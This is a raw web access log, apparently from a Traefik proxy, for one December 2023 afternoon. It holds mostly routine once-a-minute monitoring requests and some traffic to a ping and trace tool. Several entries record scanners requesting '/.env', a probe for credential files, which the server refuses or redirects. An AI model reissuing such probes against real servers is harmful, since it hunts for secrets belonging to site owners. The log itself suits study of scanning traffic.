159.203.109.206 - - [19/Dec/2023:17:59:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10332 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:17:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10333 "www@docker" "http://172.18.0.9:80" 1ms
198.244.213.98 - - [19/Dec/2023:17:59:42 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10334 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:18:00:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10335 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10336 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:01:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10337 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10338 "www@docker" "http://172.18.0.9:80" 1ms
159.65.89.163 - - [19/Dec/2023:18:01:55 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 10339 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:18:02:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10340 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10341 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:03:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10342 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [19/Dec/2023:18:03:22 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 10343 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:18:03:22 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 10344 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:18:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10345 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:04:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10346 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10347 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:05:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10348 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10349 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:18:05:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10350 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:18:06:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10351 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10352 "www@docker" "http://172.18.0.9:80" 1ms
178.62.13.82 - - [19/Dec/2023:18:07:16 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 10353 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:18:07:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10354 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:18:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10355 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:08:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10356 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10357 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:09:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10358 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10359 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:10:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10360 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10361 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:11:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10362 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10363 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:12:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10364 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10365 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:13:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10366 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10367 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:14:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10368 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:18:14:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10369 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:15:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10370 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:18:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10371 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:16:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10372 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:16:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10373 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:17:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10374 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10375 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:18:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10376 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:18:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10377 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:19:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10378 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:19:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10379 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:20:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10380 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:20:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10381 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:21:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10382 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:21:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10383 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:22:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10384 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:22:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10385 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:23:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10386 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:23:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10387 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:24:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10388 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10389 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:25:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10390 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:25:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10391 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:26:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10392 "www@docker" "http://172.18.0.9:80" 1ms
84.247.102.13 - - [19/Dec/2023:18:26:34 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 10393 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:18:26:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10394 "www@docker" "http://172.18.0.9:80" 0ms
84.247.102.13 - - [19/Dec/2023:18:26:35 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 10395 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:18:27:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10396 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:27:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10397 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:28:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10398 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:28:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10399 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:29:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10400 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:29:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10401 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:30:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10402 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:30:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10403 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:31:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10404 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:31:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10405 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:32:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10406 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:18:32:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10407 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:33:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10408 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:33:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10409 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:34:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10410 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:34:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10411 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:35:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10412 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:35:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10413 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:36:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10414 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:36:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10415 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:37:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10416 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:37:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10417 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:38:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10418 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:38:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10419 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:39:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10420 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:39:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10421 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:40:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10422 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:40:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10423 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:41:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10424 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:18:41:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10425 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:42:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10426 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:42:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10427 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:43:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10428 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:43:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10429 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:44:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10430 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:18:44:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10431 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:45:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10432 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:45:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10433 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:46:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10434 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:46:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10435 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:47:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10436 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:47:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10437 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:48:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10438 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:48:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10439 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:49:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10440 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:18:49:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10441 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:50:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10442 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:50:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10443 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:51:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10444 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:18:51:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10445 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:52:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10446 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:18:52:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10447 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:53:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10448 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:53:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10449 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:54:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10450 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:18:54:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10451 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:55:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10452 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:55:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10453 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:56:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10454 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:56:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10455 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:57:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10456 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10457 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:18:58:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10458 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:18:58:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10459 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:18:59:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10460 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:18:59:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10461 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:00:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10462 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:00:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10463 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:01:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10464 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:01:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10465 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:02:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10466 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:02:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10467 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:03:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10468 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:19:03:24 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10469 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:19:03:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10470 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:04:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10471 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:04:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10472 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:05:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10473 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:05:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10474 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:06:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10475 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:06:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10476 "www@docker" "http://172.18.0.9:80" 0ms
167.248.133.36 - - [19/Dec/2023:19:07:19 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10477 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:19:07:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10478 "www@docker" "http://172.18.0.9:80" 0ms
167.248.133.36 - - [19/Dec/2023:19:07:22 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10479 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:19:07:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10480 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:08:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10481 "www@docker" "http://172.18.0.9:80" 90ms
167.71.120.76 - - [19/Dec/2023:19:08:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10482 "www@docker" "http://172.18.0.9:80" 24ms
45.79.181.223 - - [19/Dec/2023:19:08:38 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10483 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:19:09:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10484 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:09:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10485 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:10:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10486 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:10:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10487 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:11:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10488 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:11:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10489 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:12:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10490 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:12:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10491 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:19:13:11 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10492 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:19:13:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10493 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:13:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10494 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:14:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10495 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:14:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10496 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:15:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10497 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:15:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10499 "www@docker" "http://172.18.0.9:80" 0ms
172.56.196.1 - - [19/Dec/2023:19:15:32 +0000] "GET /trace/ HTTP/2.0" 200 6056 "-" "-" 10498 "livetrace@docker" "http://172.18.0.3:80" 5074ms
172.56.196.1 - - [19/Dec/2023:19:15:41 +0000] "GET /trace/startping.php?id=orpk26byz HTTP/2.0" 200 103 "-" "-" 10500 "livetrace@docker" "http://172.18.0.3:80" 5ms
172.56.196.1 - - [19/Dec/2023:19:15:41 +0000] "GET /trace/starttrace.php?id=rvfv33aao HTTP/2.0" 200 104 "-" "-" 10501 "livetrace@docker" "http://172.18.0.3:80" 5ms
172.56.196.1 - - [19/Dec/2023:19:15:42 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10502 "livetrace@docker" "http://172.18.0.3:80" 4ms
172.56.196.1 - - [19/Dec/2023:19:15:42 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 261 "-" "-" 10503 "livetrace@docker" "http://172.18.0.3:80" 3ms
172.56.196.1 - - [19/Dec/2023:19:15:43 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10504 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:43 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 261 "-" "-" 10505 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:15:44 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 261 "-" "-" 10507 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:15:44 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10506 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:45 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10508 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:15:45 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 301 "-" "-" 10509 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:46 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10510 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:46 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 301 "-" "-" 10511 "livetrace@docker" "http://172.18.0.3:80" 2ms
